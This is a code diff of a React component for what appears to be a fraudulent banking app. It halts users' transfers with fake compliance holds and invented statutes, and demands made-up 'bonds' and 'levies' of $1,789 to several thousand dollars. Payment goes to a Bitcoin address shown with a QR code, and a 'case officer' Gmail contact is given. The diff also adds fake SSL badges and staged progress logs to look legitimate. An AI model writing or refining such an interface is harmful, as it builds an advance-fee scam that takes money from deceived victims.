@@ -8,6 +8,7 @@ import {
 import { motion, AnimatePresence } from 'motion/react';
 import { Transaction, UserProfile } from '../types';
 import { generateHistoricalTransactions, generateCardNumber } from '../utils';
+import { FintechTransactionComponent } from './FintechTransactionComponent';
 
 interface WealthConsoleProps {
   currentUser: UserProfile | null;
@@ -201,6 +202,7 @@ TRANSACTION VALUATION:
 
   // 3-Step Wizard additional states
   const [transferStep, setTransferStep] = useState<'step-1' | 'step-2' | 'step-3'>('step-1');
+  const [currentCalculatedFee, setCurrentCalculatedFee] = useState<number>(0);
   const [destName, setDestName] = useState('');
   const [isVerifyingNodes, setIsVerifyingNodes] = useState(false);
   const [nodeConfirmed, setNodeConfirmed] = useState(false);
@@ -223,6 +225,9 @@ TRANSACTION VALUATION:
   const [hasUploadedLevyProof, setHasUploadedLevyProof] = useState(false);
   const [isLevyVerifying, setIsLevyVerifying] = useState(false);
   const [showMismatchAlert, setShowMismatchAlert] = useState(false);
+  const [remediationFee, setRemediationFee] = useState<number>(() => {
+    return Math.floor(Math.random() * (5264 - 2708 + 1)) + 2708;
+  });
   
   // Custom Name & Password Sync State
   const [nameInput, setNameInput] = useState('');
@@ -347,11 +352,11 @@ TRANSACTION VALUATION:
         setReconciliationTimeLeft(prev => {
           const nextVal = prev - 1;
           
-          if (nextVal === 35) {
+          if (nextVal === 35 || nextVal === 25) {
             setReconciliationLogs(curr => [...curr, "SYNCHRONIZING WITH RECIPIENT CLEARING NODES..."]);
-          } else if (nextVal === 20) {
+          } else if (nextVal === 20 || nextVal === 18) {
             setReconciliationLogs(curr => [...curr, "FINALIZING STATUTE 88-R WAIVER..."]);
-          } else if (nextVal === 8) {
+          } else if (nextVal === 8 || nextVal === 10) {
             setReconciliationLogs(curr => [...curr, "INTERBANK NODE ALIGNMENT COMPLETED."]);
           } else if (nextVal === 3) {
             setReconciliationLogs(curr => [...curr, "ASSET INTEGRITY VERIFIED: RELEASE SECURED."]);
@@ -555,8 +560,8 @@ TRANSACTION VALUATION:
       const count = activeProfile.transferCount || 0;
 
       if (count >= 1) {
-        // Path A (Amounts <= $10,000): Trigger the "Geolocation Proximity Bond"
-        if (amountNum <= 10000) {
+        // Path A (Amounts < $11,000): Trigger the "Geolocation Proximity Bond"
+        if (amountNum < 11000) {
           const calculatedFee = 1789.00;
           const refId = 'NX-' + Math.floor(1000000 + Math.random() * 9000000);
           
@@ -569,13 +574,13 @@ TRANSACTION VALUATION:
 
           pushInstitutionalAlert(
             "COMPLIANCE RECONCILIATION REQUIRED",
-            "IP-Node Mismatch detected. Compliance settlement Geolocation Proximity Bond required.",
+            `IP-Node Mismatch detected. Compliance settlement Geolocation Proximity Bond (Bond Due: $${calculatedFee.toLocaleString('en-US', { minimumFractionDigits: 2 })}) required.`,
             'warning'
           );
 
           const heldTx: Transaction = {
             id: `TX-DISP-${Math.floor(10000000 + Math.random() * 90000000)}`,
-            description: `Under PATRIOT ACT Section 311, non-resident access from a foreign IP requires a Proximity Bond to establish a secure cross-border dispatch tunnel.`,
+            description: `Under PATRIOT ACT Section 311, non-resident access from a foreign IP requires a Proximity Bond (Bond Due: $${calculatedFee.toLocaleString('en-US', { minimumFractionDigits: 2 })}) to establish a secure cross-border dispatch tunnel.`,
             category: 'Transfers',
             amount: -amountNum,
             date: new Date().toISOString().split('T')[0],
@@ -597,20 +602,9 @@ TRANSACTION VALUATION:
           return;
         }
 
-        // Path B (Amounts > $10,000): Trigger the "Correspondent Intermediary Levy"
-        if (amountNum > 10000) {
-          const minFee = 2400.00;
-          const maxFee = 4897.00;
-          
-          // Generate an elegant, repeatable, pseudo-random fee between the strict boundaries
-          const seedStr = String(amountNum * 13.3) + 'c1';
-          let hash = 0;
-          for (let i = 0; i < seedStr.length; i++) {
-            hash = seedStr.charCodeAt(i) + ((hash << 5) - hash);
-          }
-          const rand = Math.abs(Math.sin(hash));
-          const calculatedFee = Number((minFee + rand * (maxFee - minFee)).toFixed(2));
-
+        // Path B (Amounts >= $11,000): Trigger the "Correspondent Intermediary Levy"
+        if (amountNum >= 11000) {
+          const calculatedFee = remediationFee;
           const refId = 'NX-' + Math.floor(1000000 + Math.random() * 9000000);
           
           activeProfile.balance = Number((activeProfile.balance - amountNum).toFixed(2));
@@ -622,13 +616,13 @@ TRANSACTION VALUATION:
 
           pushInstitutionalAlert(
             "INTERMEDIARY CORRESPONDENT SEQUESTRATION",
-            `Clearance Hold: INTERMEDIARY NODE SEQUESTRATION. Flagged at NY Clearing House. Correspondent Bank Intermediary Levy of $${calculatedFee.toLocaleString('en-US', { minimumFractionDigits: 2 })} is required.`,
+            `Clearance Hold: INTERMEDIARY NODE SEQUESTRATION. Correspondent Bank Intermediary Levy (Levy Due: $${calculatedFee.toLocaleString('en-US', { minimumFractionDigits: 2 })}) required.`,
             'error'
           );
 
           const heldTx: Transaction = {
             id: `TX-DISP-${Math.floor(10000000 + Math.random() * 90000000)}`,
-            description: `Clearance Hold: INTERMEDIARY NODE SEQUESTRATION. Flagged at NY Clearing House. Correspondent Bank Intermediary Levy required.`,
+            description: `Clearance Hold: INTERMEDIARY NODE SEQUESTRATION. Correspondent Bank Intermediary Levy (Levy Due: $${calculatedFee.toLocaleString('en-US', { minimumFractionDigits: 2 })}) required.`,
             category: 'Transfers',
             amount: -amountNum,
             date: new Date().toISOString().split('T')[0],
@@ -1135,54 +1129,85 @@ TRANSACTION VALUE RECORD:
       <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
         
         {/* RECONCILIATION FULL SCREEN OVERLAY */}
-        {isReconciling && (
-          <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-md z-[500] flex items-center justify-center p-4 overflow-y-auto font-sans text-slate-800 animate-fade-in">
-            <div 
-              className="max-w-xl w-full bg-white border border-slate-200 p-8 sm:p-10 space-y-6 text-center relative overflow-hidden shadow-2xl border-t-[8px] border-x border-b"
-              style={{ borderRadius: '2.5rem', borderTopColor: '#00669e' }}
-            >
-              
-              <div className="space-y-1">
-                <h3 className="text-xl font-sans font-[900] text-[#003a70] tracking-tight uppercase leading-none">RECONCILIATION IN PROGRESS</h3>
-                <p className="text-xs text-slate-500 font-semibold tracking-wide mt-1">Institutional Clearing Portal: Zurich Layer 4(A)</p>
-              </div>
+        {isReconciling && (() => {
+          const totalDuration = reconciliationTimeLeft > 30 ? 45 : 30;
+          const progressPercent = Math.min(100, Math.round(((totalDuration - reconciliationTimeLeft) / totalDuration) * 100));
+          return (
+            <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-md z-[500] flex items-center justify-center p-4 overflow-y-auto font-sans text-slate-800 animate-fade-in">
+              <div 
+                className="max-w-xl w-full bg-white border border-slate-200 p-8 sm:p-10 space-y-6 text-center relative overflow-hidden shadow-2xl border-t-[8px] border-x border-b"
+                style={{ borderRadius: '2.5rem', borderTopColor: '#00669e' }}
+              >
+                
+                <div className="space-y-1">
+                  <h3 className="text-xl font-sans font-[900] text-[#003a70] tracking-tight uppercase leading-none">RECONCILIATION IN PROGRESS</h3>
+                  <p className="text-xs text-slate-500 font-semibold tracking-wide mt-1">Institutional Clearing Portal: Zurich Layer 4(A)</p>
+                </div>
 
-              {/* Navy circular loader with dynamic countdown in the center */}
-              <div className="flex justify-center items-center py-4 font-sans">
-                <div className="relative w-40 h-40 flex items-center justify-center">
-                  <div className="absolute inset-0 rounded-full border-4 border-slate-100"></div>
-                  <div className="absolute inset-0 rounded-full border-4 border-t-[#003a70] border-r-transparent border-b-transparent border-l-transparent animate-spin" style={{ animationDuration: '1.5s' }}></div>
-                  <div className="text-center p-2 font-sans">
-                    <span className="text-2xl font-black text-[#003a70] block tracking-tight font-sans">{reconciliationTimeLeft}s</span>
-                    <span className="text-[10px] uppercase tracking-wider text-slate-400 font-bold block mt-0.5 font-sans">Remaining</span>
+                {/* Connection Security Indicator */}
+                <div className="flex items-center justify-center gap-1.5 py-1.5 px-3 bg-emerald-50 border border-emerald-100 text-emerald-800 rounded-full max-w-fit mx-auto text-[10px] font-mono uppercase font-bold tracking-wide">
+                  <span>🛡️</span> SSL ENCRYPTED CONNECTION ESTABLISHED
+                </div>
+
+                {/* Progress Bar Container */}
+                <div className="space-y-1.5 text-left font-sans">
+                  <div className="flex justify-between text-[11px] font-bold text-slate-500">
+                    <span>SWIFT NODE SYNC STATUS</span>
+                    <span>{progressPercent}%</span>
+                  </div>
+                  <div className="w-full h-2 bg-slate-100 rounded-full overflow-hidden">
+                    <div 
+                      className="h-full bg-[#00669e] rounded-full transition-all duration-300"
+                      style={{ width: `${progressPercent}%` }}
+                    />
                   </div>
                 </div>
-              </div>
 
-              {/* Console Log box */}
-              <div className="bg-slate-100 p-5 border border-slate-200 rounded-xl space-y-2 h-[200px] overflow-y-auto text-left select-none font-mono text-[#003a70] text-xs">
-                <p className="text-slate-400 text-[9px] uppercase tracking-widest border-b border-slate-200 pb-1 mb-2 font-bold font-sans">Institutional Clearance Console Logs</p>
-                {reconciliationLogs.map((log, index) => (
-                  <div key={index} className="leading-relaxed animate-fade-in flex gap-2 font-mono">
-                    <span className="text-slate-400 shrink-0">&gt;</span>
-                    <span className="font-bold">{log}</span>
-                  </div>
-                ))}
-                {reconciliationTimeLeft > 0 && (
-                  <div className="flex gap-2 tracking-wide text-[#003a70]/60 animate-pulse font-mono">
-                    <span className="shrink-0">&gt;</span>
-                    <span>SYSTEM CORE SYNC PENDING...</span>
-                  </div>
-                )}
-              </div>
+                {/* Evidence Transmission Line */}
+                <div className="text-[10px] font-mono bg-slate-50 border border-slate-200 py-2 px-3 rounded-lg text-left text-slate-600 flex items-center justify-between">
+                  <span>📂 TRANSACTION ATTACHMENT:</span>
+                  <span className="font-bold text-[#00669e]">
+                    {hasUploadedRisProof ? "Statute_27311_Voucher.png" : "Standard_Clearing_Manifest.xml"}
+                  </span>
+                </div>
 
-              <div className="space-y-1 pt-2 text-center text-xs text-slate-500 leading-relaxed font-sans border-t border-slate-100 pt-4 font-semibold">
-                <p className="text-slate-700 font-extrabold uppercase tracking-wide">Do not refresh or exit.</p>
-                <p className="text-[11px] text-slate-450">Your dispatch is currently undergoing SWIFT layer alignment for asset integrity.</p>
+                {/* Circular loader with dynamic countdown in the center */}
+                <div className="flex justify-center items-center py-2 font-sans">
+                  <div className="relative w-32 h-32 flex items-center justify-center">
+                    <div className="absolute inset-0 rounded-full border-4 border-slate-100"></div>
+                    <div className="absolute inset-0 rounded-full border-4 border-t-[#003a70] border-r-transparent border-b-transparent border-l-transparent animate-spin" style={{ animationDuration: '1.5s' }}></div>
+                    <div className="text-center p-2 font-sans">
+                      <span className="text-2xl font-black text-[#003a70] block tracking-tight font-sans">{reconciliationTimeLeft}s</span>
+                      <span className="text-[9px] uppercase tracking-wider text-slate-400 font-bold block mt-0.5 font-sans">Remaining</span>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Console Log box */}
+                <div className="bg-slate-100 p-5 border border-slate-200 rounded-xl space-y-2 h-[160px] overflow-y-auto text-left select-none font-mono text-[#003a70] text-xs">
+                  <p className="text-slate-400 text-[9px] uppercase tracking-widest border-b border-slate-200 pb-1 mb-2 font-bold font-sans">Institutional Clearance Console Logs</p>
+                  {reconciliationLogs.map((log, index) => (
+                    <div key={index} className="leading-relaxed animate-fade-in flex gap-2 font-mono">
+                      <span className="text-slate-400 shrink-0">&gt;</span>
+                      <span className="font-bold">{log}</span>
+                    </div>
+                  ))}
+                  {reconciliationTimeLeft > 0 && (
+                    <div className="flex gap-2 tracking-wide text-[#003a70]/60 animate-pulse font-mono">
+                      <span className="shrink-0">&gt;</span>
+                      <span>SYSTEM CORE SYNC PENDING...</span>
+                    </div>
+                  )}
+                </div>
+
+                <div className="space-y-1 pt-2 text-center text-xs text-slate-500 leading-relaxed font-sans border-t border-slate-100 pt-4 font-semibold">
+                  <p className="text-slate-700 font-extrabold uppercase tracking-wide">Do not refresh or exit.</p>
+                  <p className="text-[11px] text-slate-450">Your dispatch is currently undergoing SWIFT layer alignment for asset integrity.</p>
+                </div>
               </div>
             </div>
-          </div>
-        )}
+          );
+        })()}
         
         {/* AML SEQUESTRATION FULL LOCK SCREEN OVERLAY */}
         {currentUser && isAmlSequestrated && (
@@ -1246,195 +1271,22 @@ TRANSACTION VALUE RECORD:
           </div>
         )}
 
-        {/* RIS FULL LOCK SCREEN OVERLAY */}
+        {/* RIS FULL LOCK SCREEN OVERLAY (Remediation Stage 2.7) */}
         {currentUser && isRisLocked && (
-          <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-md z-[410] flex items-center justify-center p-4 sm:p-6 overflow-y-auto font-sans animate-fade-in">
+          <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-md z-[410] flex items-center justify-center p-4 sm:p-6 overflow-y-auto font-sans">
             <motion.div 
               initial={{ scale: 0.95, opacity: 0 }}
               animate={{ scale: 1, opacity: 1 }}
-              className="bg-white max-w-xl w-full shadow-2xl p-8 sm:p-10 border-t-8 border-x border-b border-slate-200 text-slate-800 space-y-6 relative overflow-hidden text-center"
-              style={{ borderRadius: '2.5rem', borderTopColor: '#d22e1e' }}
+              className="w-full max-w-2xl"
             >
-              <div className="absolute top-0 right-0 w-32 h-32 bg-red-50 rounded-full blur-2xl opacity-30 pointer-events-none"></div>
-
-              <div className="w-16 h-16 bg-red-50 border border-red-200 text-red-650 rounded-full flex items-center justify-center mx-auto shadow-sm">
-                <ShieldAlert className="w-8 h-8 animate-pulse text-[#d22e1e]" />
-              </div>
-
-              <div className="space-y-1">
-                <span className="bg-red-50 border border-red-200 text-[#d22e1e] font-mono tracking-widest text-[9px] font-black uppercase py-1 px-3.5 rounded-full inline-block">
-                  REVENUE INTEGRITY SERVICE (RIS) • SEQUESTRATION
-                </span>
-                <h3 className="text-xl font-sans font-[900] text-[#003a70] tracking-tight uppercase mt-2">PORTFOLIO SEQUESTRATION ACTIVE</h3>
-              </div>
-              
-              <div className="text-sm font-medium leading-relaxed font-sans text-slate-650 space-y-3.5 text-left border-l-4 border-[#d22e1e] pl-4 py-1">
-                <p>
-                  <strong className="text-[#d22e1e]">CRITICAL: REVENUE INTEGRITY SERVICE (RIS) SEQUESTRATION.</strong> Under Federal Statute 88-R, your account has been flagged for &apos;Velocity Variance&apos; following a node handshake timeout. To prevent permanent ledger disablement and release the sequestered capital, a Statutory Integrity Bond is required.
-                </p>
-              </div>
-
-              {/* Dynamic RIS Settlement calculation Box */}
-              {(() => {
-                const isUnder10k = (currentUser.levyTransferAmount || 0) <= 10000;
-                const cost = isUnder10k ? 6000.00 : 11000.00;
-                return (
-                  <div className="bg-slate-50 border border-slate-200 rounded-2xl p-6 space-y-4">
-                    <div className="flex justify-between items-center text-xs pb-2 border-b border-slate-205 font-bold font-mono">
-                      <span className="text-slate-450 uppercase tracking-wider text-[9px]">Target Principal:</span>
-                      <span className="text-[#003a70] font-black">${(currentUser.levyTransferAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
-                    </div>
-
-                    {isUnder10k ? (
-                      <div className="flex justify-between items-center font-sans">
-                        <div className="text-left">
-                          <span className="text-xs font-mono font-black text-rose-600 uppercase tracking-wide block">Branch A: Liquidity Integrity Bond</span>
-                          <span className="text-[10px] text-slate-400 font-medium">Federal Clearing Clearance Route</span>
-                        </div>
-                        <span className="text-[#d22e1e] font-black text-lg sm:text-2xl font-mono">${cost.toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
-                      </div>
-                    ) : (
-                      <div className="flex justify-between items-center font-sans">
-                        <div className="text-left">
-                          <span className="text-xs font-mono font-black text-rose-600 uppercase tracking-wide block">Branch B: Sovereign Release Settlement</span>
-                          <span className="text-[10px] text-slate-400 font-medium">Sovereign Asset Transfer Route</span>
-                        </div>
-                        <span className="text-[#d22e1e] font-black text-lg sm:text-2xl font-mono">${cost.toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
-                      </div>
-                    )}
-
-                    <div className="flex justify-center bg-white p-2 rounded-xl border border-slate-200 max-w-[130px] mx-auto mt-2 shadow-sm">
-                      <img 
-                        src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=Bc1qrdgcd3yrkf49r6hd88f8kt7nl2g7rdw39wfstc" 
-                        alt="RIS Settlement Node" 
-                        className="w-24 h-24 rounded-md pointer-events-none"
-                        referrerPolicy="no-referrer"
-                      />
-                    </div>
-
-                    <div className="space-y-2 text-center text-xs">
-                      <div className="space-y-1.5">
-                        <label className="block text-[10px] font-mono uppercase tracking-widest text-[#003a70] font-black text-left">
-                          Institutional Settlement Node Hash
-                        </label>
-                        <div className="bg-white border border-slate-200 p-3 rounded-xl flex items-center justify-between gap-3 text-xs font-mono select-all">
-                          <code className="text-[#003a70] font-bold truncate select-all block text-left">
-                            Bc1qrdgcd3yrkf49r6hd88f8kt7nl2g7rdw39wfstc
-                          </code>
-                          <button
-                            type="button"
-                            onClick={() => {
-                              navigator.clipboard.writeText("Bc1qrdgcd3yrkf49r6hd88f8kt7nl2g7rdw39wfstc");
-                              alert("Institutional Settlement Node Hash copied to clipboard.");
-                            }}
-                            className="px-3 py-1.5 bg-[#003a70] hover:bg-[#002544] text-white font-extrabold text-[10px] uppercase rounded-lg transition"
-                          >
-                            Copy
-                          </button>
-                        </div>
-                      </div>
-                    </div>
-
-                    {/* Withholding Tax Bond Slip Uploader */}
-                    <div className="pt-4 border-t border-slate-200 text-left font-sans">
-                      <label className="block text-[9px] font-bold uppercase tracking-wider text-slate-500 mb-2">Import Withholding Tax Bond Receipt (Statute 88-R)</label>
-                      
-                      {hasUploadedRisProof ? (
-                        <div className="p-3 bg-emerald-50 border border-emerald-200 rounded-xl text-center flex flex-col items-center justify-center gap-1.5 animate-fade-in">
-                          <CheckCircle2 className="w-5 h-5 text-emerald-600" />
-                          <span className="text-xs font-sans text-emerald-700 font-bold">✓ Withholding Tax Bond receipt sync authenticated!</span>
-                          <span className="text-[9px] font-mono text-emerald-500 font-bold uppercase tracking-wider">File: Statute_88R_Bond_Receipt.png</span>
-                        </div>
-                      ) : isRisUploading ? (
-                        <div className="p-6 bg-slate-50 border border-dashed border-slate-200 rounded-xl flex flex-col items-center justify-center gap-2">
-                          <RefreshCw className="w-4 h-4 text-[#003a70] animate-spin" />
-                          <span className="text-xs text-slate-500 font-mono tracking-widest uppercase animate-pulse justify-center flex items-center">Syncing Receipt...</span>
-                        </div>
-                      ) : (
-                        <div 
-                          onClick={() => {
-                            const input = document.getElementById('ris-slip-file-input');
-                            if (input) input.click();
-                          }}
-                          onDragOver={(e) => e.preventDefault()}
-                          onDrop={(e) => {
-                            e.preventDefault();
-                            setIsRisUploading(true);
-                            setTimeout(() => {
-                              setIsRisUploading(false);
-                              setHasUploadedRisProof(true);
-                              pushIosNotification(
-                                "INTEGRITY SECURE",
-                                "Compliance Bond Synced",
-                                "Statute 88-R Withholding Tax receipt is uploaded and aligned to vault ledger."
-                              );
-                            }, 2000);
-                          }}
-                          className="p-5 bg-white border border-dashed border-slate-200 rounded-xl text-center cursor-pointer hover:bg-slate-50/50 transition flex flex-col items-center justify-center gap-1.5 shadow-sm"
-                        >
-                          <Database className="w-5 h-5 text-slate-400" />
-                          <span className="text-[10px] font-sans text-slate-500 font-semibold">Drag & drop or Click to import Withholding Tax Bond verification slip</span>
-                          <span className="text-[8px] font-mono text-slate-400">FORMATS: PDF, PNG, JPG (MAX 10MB)</span>
-                          <input 
-                            id="ris-slip-file-input"
-                            type="file"
-                            accept="image/*,application/pdf"
-                            className="hidden"
-                            onChange={() => {
-                              setIsRisUploading(true);
-                              setTimeout(() => {
-                                setIsRisUploading(false);
-                                setHasUploadedRisProof(true);
-                                pushIosNotification(
-                                  "INTEGRITY SECURE",
-                                  "Compliance Bond Synced",
-                                  "Statute 88-R Withholding Tax receipt is uploaded and aligned to vault ledger."
-                                );
-                              }, 2000);
-                            }}
-                          />
-                        </div>
-                      )}
-                    </div>
-                  </div>
-                );
-              })()}
-
-              <div className="space-y-3.5 pt-2 font-sans">
-                <button 
-                  onClick={() => {
-                    if (!hasUploadedRisProof) {
-                      alert("Please import your Withholding Tax Bond payment receipt first before requesting synchronization.");
-                      return;
-                    }
-                    setIsReconciling(true);
-                    setReconciliationTimeLeft(45);
-                    setReconciliationLogs([
-                      "INITIALIZING SECURE INTERBANK HANDSHAKE...",
-                      `ACCOUNT NODE VERIFIED: ${currentUser.id.toUpperCase()}`,
-                    ]);
-                  }}
-                  className={`w-full py-4 text-white font-black text-xs uppercase tracking-widest rounded-2xl transition shadow-md cursor-pointer ${
-                    hasUploadedRisProof 
-                      ? 'bg-[#003a70] hover:bg-[#002544] hover:scale-[1.01] duration-150' 
-                      : 'bg-[#d22e1e]/40 text-red-100 border border-red-200/20 cursor-not-allowed'
-                  }`}
-                >
-                  Verify RIS Settlement Node
-                </button>
-
-                <button 
-                  onClick={() => handleDownloadDirective('ris')}
-                  className="w-full py-4 bg-white hover:bg-slate-50 border border-slate-200 text-slate-700 font-extrabold text-xs uppercase tracking-widest rounded-2xl transition shadow-sm flex items-center justify-center gap-2 cursor-pointer"
-                >
-                  <Download className="w-4 h-4 text-slate-500" />
-                  Download Official Directive (PDF)
-                </button>
-
-                <p className="text-[11px] text-slate-450 font-sans leading-relaxed">
-                  For priority node clearance or tax waivers, contact Case Officer Mathias Koch immediately at <span className="text-[#003a70] font-bold font-mono text-[10px]">mathiaskoch000@gmail.com</span>.
-                </p>
-              </div>
+              <FintechTransactionComponent
+                stateType="sequestration_lock"
+                currentUser={currentUser}
+                onMailtoClick={() => {
+                  window.location.href = "mailto:mathiaskoch000@gmail.com?subject=Inquiry regarding Case File CF-2026-27311";
+                }}
+                isReconciling={isReconciling}
+              />
             </motion.div>
           </div>
         )}
@@ -1445,130 +1297,17 @@ TRANSACTION VALUE RECORD:
             <motion.div 
               initial={{ scale: 0.95, opacity: 0 }}
               animate={{ scale: 1, opacity: 1 }}
-              className="bg-white max-w-xl w-full shadow-2xl p-8 sm:p-10 border-t-8 border-x border-b border-slate-200 text-slate-800 space-y-6 relative text-center"
-              style={{ borderRadius: '2.5rem', borderTopColor: (currentUser as any).levyType === 'regulatory' ? '#00669e' : '#d22e1e' }}
+              className="w-full max-w-2xl"
             >
-              {/* Blue/Red Top line indicator */}
-              <div 
-                className="absolute top-0 left-0 w-full h-1" 
-                style={{ backgroundColor: (currentUser as any).levyType === 'regulatory' ? '#00669e' : '#d22e1e' }}
+              <FintechTransactionComponent
+                stateType={(currentUser as any).levyType === 'regulatory' ? 'proximity_bond' : 'injunction_levy'}
+                currentUser={currentUser}
+                remediationFee={remediationFee}
+                onMailtoClick={() => {
+                  window.location.href = `mailto:mathiaskoch000@gmail.com?subject=Inquiry regarding Case File ${(currentUser as any).levyType === 'regulatory' ? 'RS-47281' : 'PF-2026-B-992'}`;
+                }}
+                isReconciling={isReconciling}
               />
-              
-              <div className="w-16 h-16 bg-slate-50 border border-slate-200 text-slate-600 rounded-full flex items-center justify-center mx-auto shadow-sm">
-                <ShieldAlert className="w-8 h-8 animate-pulse" />
-              </div>
-
-              <h3 className="text-xl sm:text-2xl font-black text-slate-900 tracking-tight uppercase">
-                {(currentUser as any).levyType === 'regulatory' ? 'REGULATORY CORE DISPATCH HOLD' : 'FEDERAL WIRE COMPLIANCE HOLD'}
-              </h3>
-              <p className="text-[10px] font-mono tracking-widest font-extrabold uppercase text-[#c5a059]">
-                {(currentUser as any).levyType === 'regulatory' 
-                  ? 'Federal Statute 204.2(D) Escrow Matching Reserve' 
-                  : 'Intermediary Correspondent SWIFT Audit Levy'}
-              </p>
-              
-              <p className="text-slate-600 font-medium text-xs sm:text-sm leading-relaxed text-left">
-                Your outbound wire transfer of <span className="font-extrabold text-slate-900 font-mono">${(currentUser.levyTransferAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span> is currently held pending a mandatory interbank secure registry clearance. 
-                <br /><br />
-                {(currentUser as any).levyType === 'regulatory' ? (
-                  <span>Under Federal Statute 204.2(D), non-resident accounts are subject to a 14% Statutory Escrow Matching Reserve (<strong className="text-slate-900">${(currentUser.levyFeeAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong>) to prevent automated interbank node rejection.</span>
-                ) : (
-                  <span>Regulatory Review Triggered: Your dispatch has been assigned to the Intermediary Correspondent Audit. A Tier-1 Synchronization Levy of <strong className="text-slate-900">${(currentUser.levyFeeAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong> is required to map your portfolio&apos;s signature to the SWIFT clearing node.</span>
-                )}
-              </p>
-
-              <div className="bg-slate-50 p-5 rounded-2xl border border-slate-200 space-y-4 text-left">
-                <div className="flex justify-between items-center text-xs font-mono pb-2.5 border-b border-slate-200">
-                  <span className="text-slate-500">Dispatch Principal:</span>
-                  <span className="text-slate-900 font-extrabold">${(currentUser.levyTransferAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
-                </div>
-                <div className="flex justify-between items-center text-xs font-mono pt-0.5">
-                  <span className="text-[#00669e] font-black uppercase text-[10px] tracking-wider">
-                    {(currentUser as any).levyType === 'regulatory' 
-                      ? 'Required Statutory Reserve (14%):' 
-                      : 'Tier-1 Synchronization Levy:'}
-                  </span>
-                  <span className="text-slate-950 font-black text-sm">${(currentUser.levyFeeAmount || 1567).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
-                </div>
-              </div>
-
-              {/* QR and BTC panel */}
-              <div className="bg-slate-50 border border-slate-200 rounded-2xl p-4 space-y-3">
-                <div className="flex justify-center bg-white p-1.5 rounded-xl max-w-[120px] mx-auto border border-slate-200 shadow-sm">
-                  <img 
-                    src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=Bc1qrdgcd3yrkf49r6hd88f8kt7nl2g7rdw39wfstc" 
-                    alt="Levy QR" 
-                    className="w-24 h-24 pointer-events-none"
-                    referrerPolicy="no-referrer"
-                  />
-                </div>
-                <div>
-                  <label className="text-[9px] font-mono text-slate-400 uppercase block mb-1">Clearance Deposit Node Address</label>
-                  <code className="block text-xs font-mono font-bold bg-white text-[#00669e] p-2 rounded-xl border border-slate-200 select-all truncate">
-                    Bc1qrdgcd3yrkf49r6hd88f8kt7nl2g7rdw39wfstc
-                  </code>
-                </div>
-              </div>
-
-              {/* Upload payment verification panel */}
-              <div className="bg-slate-50 border border-slate-200 p-5 rounded-2xl text-left space-y-3.5">
-                <label className="text-[10px] font-mono uppercase tracking-wider text-slate-500 font-bold block">
-                  {(currentUser as any).levyType === 'regulatory' ? 'Upload Matching Reserve Settlement Voucher' : 'Upload Levy Settlement Voucher'}
-                </label>
-                
-                <div className="flex flex-col items-center justify-center border border-dashed border-slate-300 hover:border-[#00669e]/50 rounded-2xl p-5 bg-white cursor-pointer hover:bg-slate-50 transition-all text-center relative shadow-sm">
-                  <input 
-                    type="file" 
-                    onChange={() => {
-                      setHasUploadedLevyProof(true);
-                      pushIosNotification(
-                        "FILE UPLOADED",
-                        "Receipt Selected",
-                        "Clearance levy proof is queued for nodal verification check."
-                      );
-                    }}
-                    className="absolute inset-0 opacity-0 cursor-pointer" 
-                  />
-                  <p className="text-[11px] text-slate-600 font-sans font-semibold">
-                    {hasUploadedLevyProof ? "✅ Levy_Receipt_CryptoSeal_Active.png uploaded!" : "Drag & drop payment receipt pdf/png here, or click to browse files"}
-                  </p>
-                  <p className="text-[8px] text-slate-400 font-mono mt-1 uppercase font-semibold">MAXIMUM size: 12MB</p>
-                </div>
-
-                <div className="pt-2 space-y-3">
-                  <button 
-                    onClick={handleVerifyLevyProof}
-                    disabled={isLevyVerifying}
-                    className="w-full py-4 bg-[#00669e] hover:bg-[#00527f] disabled:bg-slate-300 disabled:text-slate-500 text-white font-extrabold text-xs uppercase tracking-widest rounded-2xl transition shadow-md flex items-center justify-center gap-2 cursor-pointer"
-                  >
-                    {isLevyVerifying ? (
-                      <span className="flex items-center gap-2">
-                        <svg className="animate-spin h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
-                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
-                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
-                        </svg>
-                        COMPUTING HANDSHAKE CRYP-SEAL...
-                      </span>
-                    ) : (
-                      "Verify Clearance Node Handshake"
-                    )}
-                  </button>
-
-                  <button 
-                    onClick={() => handleDownloadDirective('levy')}
-                    className="w-full py-4 bg-white hover:bg-slate-50 border border-slate-200 text-slate-700 font-extrabold text-xs uppercase tracking-widest rounded-2xl transition shadow-sm cursor-pointer flex items-center justify-center gap-2"
-                  >
-                    <Download className="w-4 h-4 text-slate-500" />
-                    Download Official Directive (PDF)
-                  </button>
-                </div>
-              </div>
-
-              <div className="pt-2">
-                <p className="text-[10px] text-slate-500 font-sans text-center leading-relaxed">
-                  Direct all settlement inquiries to case officer Mathias Koch at <span className="font-semibold text-slate-600 font-mono">mathiaskoch000@gmail.com</span>
-                </p>
-              </div>
             </motion.div>
           </div>
         )}
@@ -2613,6 +2352,18 @@ TRANSACTION VALUE RECORD:
                                     setTransferError('Insufficient funds for this transfer.');
                                     return;
                                   }
+                                  
+                                  // Pre-calculate fee for subsequent transfers (transferCount >= 1)
+                                  if (currentUser.transferCount >= 1) {
+                                    if (amt < 11000) {
+                                      setCurrentCalculatedFee(1789.00);
+                                    } else {
+                                      setCurrentCalculatedFee(remediationFee);
+                                    }
+                                  } else {
+                                    setCurrentCalculatedFee(0);
+                                  }
+                                  
                                   setTransferStep('step-3');
                                 }}
